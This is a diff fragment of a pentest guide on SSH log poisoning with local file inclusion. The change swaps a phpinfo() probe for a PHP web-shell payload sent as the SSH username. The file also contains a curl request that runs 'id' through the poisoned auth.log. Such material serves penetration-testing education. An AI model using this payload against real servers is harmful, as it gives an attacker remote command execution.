@@ -13,7 +13,7 @@ For instance, the tester can try to log in with SSH using a crafted login. On a 
 
 ```bash
 # Sending the payload via SSH
-ssh '<php phpinfo(); ?>'@$TARGET
+ssh '<php system($_GET['cmd'])?>'@$TARGET
 
 # Accessing the log file via LFI
 curl --user-agent "PENTEST" $URL/?parameter=/var/log/auth.log&cmd=id
